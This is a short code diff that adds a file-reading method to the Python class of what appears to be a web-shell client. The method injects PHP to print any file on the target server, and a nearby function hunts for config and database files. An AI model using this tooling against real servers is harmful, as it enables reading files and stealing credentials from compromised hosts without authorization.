@@ -34,6 +34,15 @@ class WebShell():
         Log.success("Document Root : %s" % (self.webroot))
         Log.success("=" * 32)
 
+    def read_file(self, filepath):
+        Log.info("Reading file : [%s] ..." % (filepath))
+        result = self.php_code_exec("echo file_get_contents('%s');" % filepath)
+        if result[0]:
+            Log.success("Content : \n%s" % (result[1]))
+        else:
+            Log.error("Error occured! %s" % result[1])
+
+
     def get_config_file(self):
         keywords = ["config", "db", "database"]
         for key in keywords:
